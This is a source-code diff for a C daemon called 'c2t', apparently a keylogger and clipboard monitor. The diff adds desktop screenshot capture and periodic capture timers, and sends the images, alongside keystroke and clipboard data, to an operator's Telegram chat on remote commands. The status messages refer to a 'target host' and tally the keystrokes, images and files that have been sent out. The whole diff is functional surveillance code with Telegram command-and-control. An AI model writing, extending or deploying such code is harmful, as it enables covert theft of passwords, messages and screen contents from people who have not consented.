@@ -24,10 +24,13 @@
 #include "../logging/log_sender.h"
 #include "../logging/logging.h"
 #include "../runtime/runtime.h"
+#include "../screenshot/screenshot.h"
+#include "../screenshot/screenshot_output.h"
 #include "telegram.h"
 #include "telegram_platform.h"
 
 #include <ctype.h>
+#include <errno.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -187,64 +190,64 @@ static void handle_command(const char *text, const char *chat_id,
       match_command(text, "stop_listen") || match_command(text, "disable")) {
     int kb_enabled = !config->disable_keyboard;
     int clip_enabled = !config->disable_clipboard;
-    if (!kb_enabled && !clip_enabled) {
+    int shot_enabled = !config->disable_screenshot;
+    if (!kb_enabled && !clip_enabled && !shot_enabled) {
       telegram_send_html(
-          "⚠️ <b>All Monitoring Disabled</b>\n<i>Both clipboard and keyboard "
-          "monitoring are disabled in configuration.</i>");
+          "⚠️ <b>All Monitoring Disabled</b>\n<i>Clipboard, keyboard, and "
+          "screenshot subsystems are disabled in configuration.</i>");
     } else {
       if (clip_enabled)
         clipboard_set_paused(1);
       if (kb_enabled)
         keyboard_set_paused(1);
+      if (shot_enabled)
+        screenshot_set_paused(1);
       c2t_log_info("listener", "Monitoring paused by Telegram command");
-      char msg[512];
-      snprintf(msg, sizeof(msg),
-               "⏸️ <b>Monitoring Paused</b>\n<i>%s%s%s captures are paused "
-               "until resumed with /resume or /toggle.</i>",
-               clip_enabled ? "Clipboard" : "",
-               (clip_enabled && kb_enabled) ? " and " : "",
-               kb_enabled ? "keyboard" : "");
-      telegram_send_html(msg);
+      telegram_send_html(
+          "⏸️ <b>Monitoring Paused</b>\n<i>All active monitoring captures "
+          "are paused until resumed with /resume or /toggle.</i>");
     }
   } else if (match_command(text, "resume") || match_command(text, "unmute") ||
              match_command(text, "start_listen") ||
              match_command(text, "enable")) {
     int kb_enabled = !config->disable_keyboard;
     int clip_enabled = !config->disable_clipboard;
-    if (!kb_enabled && !clip_enabled) {
+    int shot_enabled = !config->disable_screenshot;
+    if (!kb_enabled && !clip_enabled && !shot_enabled) {
       telegram_send_html(
-          "⚠️ <b>All Monitoring Disabled</b>\n<i>Both clipboard and keyboard "
-          "monitoring are disabled in configuration.</i>");
+          "⚠️ <b>All Monitoring Disabled</b>\n<i>Clipboard, keyboard, and "
+          "screenshot subsystems are disabled in configuration.</i>");
     } else {
       if (clip_enabled)
         clipboard_set_paused(0);
       if (kb_enabled)
         keyboard_set_paused(0);
+      if (shot_enabled)
+        screenshot_set_paused(0);
       c2t_log_info("listener", "Monitoring resumed by Telegram command");
-      char msg[512];
-      snprintf(msg, sizeof(msg),
-               "▶️ <b>Monitoring Resumed</b>\n<i>c2t is actively capturing and "
-               "forwarding %s%s%s events.</i>",
-               clip_enabled ? "clipboard" : "",
-               (clip_enabled && kb_enabled) ? " and " : "",
-               kb_enabled ? "keyboard" : "");
-      telegram_send_html(msg);
+      telegram_send_html(
+          "▶️ <b>Monitoring Resumed</b>\n<i>c2t is actively capturing and "
+          "forwarding events.</i>");
     }
   } else if (match_command(text, "toggle")) {
     int kb_enabled = !config->disable_keyboard;
     int clip_enabled = !config->disable_clipboard;
-    if (!kb_enabled && !clip_enabled) {
+    int shot_enabled = !config->disable_screenshot;
+    if (!kb_enabled && !clip_enabled && !shot_enabled) {
       telegram_send_html(
-          "⚠️ <b>All Monitoring Disabled</b>\n<i>Both clipboard and keyboard "
-          "monitoring are disabled in configuration.</i>");
+          "⚠️ <b>All Monitoring Disabled</b>\n<i>Clipboard, keyboard, and "
+          "screenshot subsystems are disabled in configuration.</i>");
     } else {
       int clip_paused = clip_enabled ? clipboard_is_paused() : 1;
       int key_paused = kb_enabled ? keyboard_is_paused() : 1;
-      int target = !(clip_paused && key_paused);
+      int shot_paused = shot_enabled ? screenshot_is_paused() : 1;
+      int target = !(clip_paused && key_paused && shot_paused);
       if (clip_enabled)
         clipboard_set_paused(target);
       if (kb_enabled)
         keyboard_set_paused(target);
+      if (shot_enabled)
+        screenshot_set_paused(target);
       c2t_log_info("listener", "Monitoring toggled to %s by Telegram command",
                    target ? "paused" : "active");
       if (target) {
@@ -747,9 +750,132 @@ static void handle_command(const char *text, const char *chat_id,
   } else if (match_command(text, "logs") || match_command(text, "log")) {
     c2t_log_info("listener", "Flushing logs on-demand by /logs command");
     c2t_log_sender_dispatch_now();
+  } else if (match_command(text, "screenshot") ||
+             match_command(text, "screen") || match_command(text, "shot") ||
+             match_command(text, "capture")) {
+    if (config->disable_screenshot) {
+      telegram_send_html(
+          "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
+          "is disabled in daemon configuration (--no-screenshot).</i>");
+    } else {
+      c2t_log_info("listener",
+                   "Capturing desktop screenshot on-demand by Telegram command");
+      if (!screenshot_capture_and_send("📸 Desktop Screenshot")) {
+        telegram_send_html(
+            "⚠️ <b>Screenshot Capture Failed</b>\n<i>Unable to capture desktop "
+            "screen on target host (check permissions or active display session).</i>");
+      }
+    }
+  } else if (match_command(text, "screenshot_timer") ||
+             match_command(text, "screenshot_interval")) {
+    if (config->disable_screenshot) {
+      telegram_send_html(
+          "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
+          "is disabled in daemon configuration (--no-screenshot).</i>");
+    } else {
+      const char *arg = get_command_argument(text);
+      if (!arg || !*arg) {
+        size_t cur = screenshot_get_interval();
+        char resp[512];
+        snprintf(resp, sizeof(resp),
+                 "📸 <b>Periodic Screenshot Timer:</b> %zu s (%s)\n\n"
+                 "💡 <b>To change:</b> <code>/screenshot_timer &lt;sec&gt;</code> "
+                 "(e.g. <code>/screenshot_timer 60</code> or <code>/screenshot_timer 0</code> to disable)",
+                 cur, cur > 0 ? "🟢 Enabled" : "⚪ Disabled");
+        telegram_send_html(resp);
+      } else {
+        char *end;
+        errno = 0;
+        unsigned long val = strtoul(arg, &end, 10);
+        if (errno || val > 86400 || (val > 0 && val < 5)) {
+          telegram_send_html(
+              "⚠️ <b>Invalid Interval:</b> Must be between 5 and 86400 seconds (or 0 to disable).");
+        } else {
+          screenshot_set_interval((size_t)val);
+          char resp[512];
+          if (val == 0) {
+            snprintf(resp, sizeof(resp),
+                     "📸 <b>Periodic Screenshot Timer:</b> ⚪ <b>DISABLED</b>\n"
+                     "<i>Screenshots will only be sent on-demand via /screenshot.</i>");
+          } else {
+            snprintf(resp, sizeof(resp),
+                     "📸 <b>Periodic Screenshot Timer:</b> 🟢 <b>ENABLED</b> (%lu s)\n"
+                     "<i>A desktop screenshot will automatically be captured and sent every %lu seconds.</i>",
+                     val, val);
+          }
+          telegram_send_html(resp);
+        }
+      }
+    }
+  } else if (match_command(text, "screenshot_on") ||
+             match_command(text, "screenshot_enable") ||
+             match_command(text, "screenshot_resume") ||
+             match_command(text, "screenshot_start")) {
+    if (config->disable_screenshot) {
+      telegram_send_html(
+          "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
+          "is disabled in daemon configuration (--no-screenshot).</i>");
+    } else {
+      screenshot_set_paused(0);
+      telegram_send_html(
+          "📸 <b>Screenshot Monitoring:</b> 🟢 <b>RESUMED</b>\n<i>Periodic "
+          "screenshot captures are active.</i>");
+    }
+  } else if (match_command(text, "screenshot_off") ||
+             match_command(text, "screenshot_disable") ||
+             match_command(text, "screenshot_pause") ||
+             match_command(text, "screenshot_stop") ||
+             match_command(text, "mute_screenshot")) {
+    if (config->disable_screenshot) {
+      telegram_send_html(
+          "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
+          "is disabled in daemon configuration (--no-screenshot).</i>");
+    } else {
+      screenshot_set_paused(1);
+      telegram_send_html(
+          "📸 <b>Screenshot Monitoring:</b> ⏸️ <b>PAUSED</b>\n<i>Periodic "
+          "screenshot captures are muted.</i>");
+    }
+  } else if (match_command(text, "screenshot_toggle")) {
+    if (config->disable_screenshot) {
+      telegram_send_html(
+          "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
+          "is disabled in daemon configuration (--no-screenshot).</i>");
+    } else {
+      int s = screenshot_toggle_paused();
+      char resp[256];
+      snprintf(resp, sizeof(resp),
+               "📸 <b>Screenshot Monitoring:</b> %s",
+               s ? "⏸️ <b>PAUSED</b> (Muted)" : "🟢 <b>ACTIVE</b>");
+      telegram_send_html(resp);
+    }
+  } else if (match_command(text, "screenshot_status")) {
+    if (config->disable_screenshot) {
+      telegram_send_html(
+          "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
+          "is disabled in daemon configuration (--no-screenshot).</i>");
+    } else {
+      char shot_stat[1024];
+      screenshot_get_status_info(shot_stat, sizeof(shot_stat));
+      telegram_send_html(shot_stat);
+    }
+  } else if (match_command(text, "screenshot_help")) {
+    char shot_help[1200];
+    snprintf(
+        shot_help, sizeof(shot_help),
+        "📸 <b>Screenshot Control Commands</b>\n\n"
+        "• <code>/screenshot</code> (or <code>/shot</code>) - Capture &amp; send desktop screenshot now\n"
+        "• <code>/screenshot_timer &lt;sec&gt;</code> - Configure periodic screenshot timer (0 to disable)\n"
+        "• <code>/screenshot_on</code> - Resume periodic screenshot capturing\n"
+        "• <code>/screenshot_off</code> - Pause periodic screenshot capturing\n"
+        "• <code>/screenshot_toggle</code> - Toggle active / paused state\n"
+        "• <code>/screenshot_status</code> - View screenshot monitor status &amp; backend\n\n"
+        "💡 <i>Tip: Commands also accept dash syntax (e.g. <code>/screenshot-timer 60</code>)</i>");
+    telegram_send_html(shot_help);
   } else if (match_command(text, "status") || match_command(text, "ping")) {
     int clip_paused = clipboard_is_paused();
     int key_paused = keyboard_is_paused();
+    int shot_paused = screenshot_is_paused();
     int kb_mode = keyboard_get_format_mode();
     char kb_target[128] = "all";
     keyboard_get_selected_target(kb_target, sizeof(kb_target));
@@ -763,32 +889,41 @@ static void handle_command(const char *text, const char *chat_id,
                                 ? "❌ <b>DISABLED</b> (--no-keyboard)"
                                 : (key_paused ? "⏸️ <b>PAUSED</b> (Muted)"
                                               : "🟢 <b>ACTIVE</b> (Capturing)");
+    const char *shot_status =
+        config->disable_screenshot
+            ? "❌ <b>DISABLED</b> (--no-screenshot)"
+            : (shot_paused ? "⏸️ <b>PAUSED</b> (Muted)"
+                           : "🟢 <b>ACTIVE</b>");
 
     uint64_t clip_bytes = clipboard_get_total_bytes();
     uint64_t clip_events = clipboard_get_total_events();
     uint64_t kb_bytes = keyboard_get_total_bytes();
     uint64_t kb_keys = keyboard_get_total_keystrokes();
+    uint64_t shot_bytes = screenshot_get_total_bytes();
+    uint64_t shot_count = screenshot_get_total_captures();
     uint64_t file_bytes = c2t_files_get_total_bytes();
     uint64_t file_count = c2t_files_get_total_files();
     uint64_t log_bytes = c2t_log_sender_get_total_bytes();
     uint64_t log_count = c2t_log_sender_get_total_dispatches();
-    uint64_t total_transferred = clip_bytes + kb_bytes + file_bytes + log_bytes;
+    uint64_t total_transferred = clip_bytes + kb_bytes + shot_bytes + file_bytes + log_bytes;
 
-    char clip_b_str[64] = {}, kb_b_str[64] = {}, file_b_str[64] = {},
-         log_b_str[64] = {}, tot_b_str[64] = {};
+    char clip_b_str[64] = {}, kb_b_str[64] = {}, shot_b_str[64] = {},
+         file_b_str[64] = {}, log_b_str[64] = {}, tot_b_str[64] = {};
     format_metric_bytes(clip_bytes, clip_b_str, sizeof(clip_b_str));
     format_metric_bytes(kb_bytes, kb_b_str, sizeof(kb_b_str));
+    format_metric_bytes(shot_bytes, shot_b_str, sizeof(shot_b_str));
     format_metric_bytes(file_bytes, file_b_str, sizeof(file_b_str));
     format_metric_bytes(log_bytes, log_b_str, sizeof(log_b_str));
     format_metric_bytes(total_transferred, tot_b_str, sizeof(tot_b_str));
 
-    char status_msg[1600];
+    char status_msg[1800];
     snprintf(status_msg, sizeof(status_msg),
              "🤖 <b>c2t Daemon Status</b>\n\n"
              "• <b>Status:</b> 🟢 Active &amp; Running\n"
              "• <b>Clipboard Monitoring:</b> %s\n"
              "• <b>Keyboard Monitoring:</b> %s\n"
              "• <b>Keyboard Target:</b> <code>%s</code> (Mode: %s)\n"
+             "• <b>Screenshot Subsystem:</b> %s (Timer: %zu s)\n"
              "• <b>Periodic Logs:</b> %s (Interval: %llu s)\n"
              "• <b>File Uploads:</b> %s\n"
              "• <b>Window Info:</b> %s\n\n"
@@ -796,17 +931,20 @@ static void handle_command(const char *text, const char *chat_id,
              "• <b>Total Data Sent:</b> %s\n"
              "• 📋 <b>Clipboard:</b> %s (%llu events)\n"
              "• ⌨️ <b>Keyboard:</b> %s (%llu keystrokes)\n"
+             "• 📸 <b>Screenshots:</b> %s (%llu images)\n"
              "• 📁 <b>Files:</b> %s (%llu files sent)\n"
              "• 📜 <b>Logs:</b> %s (%llu flushes)\n\n"
              "📦 <b>Queue Limits:</b> %llu items / %llu MB",
              clip_status, kb_status, kb_target,
              kb_mode == KEYBOARD_MODE_CODE ? "Code Block" : "Raw Text",
+             shot_status, screenshot_get_interval(),
              config->telegram_send_logs ? "Enabled" : "On-demand only (/logs)",
              (unsigned long long)config->telegram_log_interval_sec,
              config->telegram_send_files ? "Enabled" : "Disabled",
              config->telegram_send_window_info ? "Enabled" : "Disabled",
              tot_b_str, clip_b_str, (unsigned long long)clip_events, kb_b_str,
-             (unsigned long long)kb_keys, file_b_str,
+             (unsigned long long)kb_keys, shot_b_str,
+             (unsigned long long)shot_count, file_b_str,
              (unsigned long long)file_count, log_b_str,
              (unsigned long long)log_count,
              (unsigned long long)config->queue_max_items,
@@ -876,6 +1014,21 @@ static void handle_command(const char *text, const char *chat_id,
       if (h_off + sizeof(kb_sec) - 1 < sizeof(help_msg)) {
         memcpy(help_msg + h_off, kb_sec, sizeof(kb_sec) - 1);
         h_off += sizeof(kb_sec) - 1;
+      }
+    }
+
+    if (!config->disable_screenshot) {
+      static const char shot_sec[] =
+          "<b>Screenshot Controls:</b>\n"
+          "• <code>/screenshot</code> (or <code>/shot</code>) - Capture &amp; send screenshot now\n"
+          "• <code>/screenshot_timer &lt;sec&gt;</code> - Set periodic capture timer (0 to disable)\n"
+          "• <code>/screenshot_on</code> / <code>/screenshot_off</code> - Enable / mute captures\n"
+          "• <code>/screenshot_toggle</code> - Toggle active / paused state\n"
+          "• <code>/screenshot_status</code> - View screenshot monitor status\n"
+          "• <code>/screenshot_help</code> - Show full screenshot commands guide\n\n";
+      if (h_off + sizeof(shot_sec) - 1 < sizeof(help_msg)) {
+        memcpy(help_msg + h_off, shot_sec, sizeof(shot_sec) - 1);
+        h_off += sizeof(shot_sec) - 1;
       }
     }
 
